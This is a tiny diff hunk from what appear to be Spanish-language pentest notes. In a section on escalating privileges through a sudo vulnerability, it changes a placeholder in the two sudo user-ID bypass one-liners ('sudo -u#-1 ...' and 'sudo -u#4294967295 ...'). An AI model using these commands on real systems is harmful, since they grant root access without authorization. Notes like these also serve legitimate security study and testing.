@@ -206,4 +206,4 @@ Ejecutarlo
 ----------------------------------------
 
 Elevar privs vuln de sudo
-sudo -u#-1 ID -u //// sudo -u#4294967295 ID -u
+sudo -u#-1 COMANDO -u //// sudo -u#4294967295 COMANDO -u
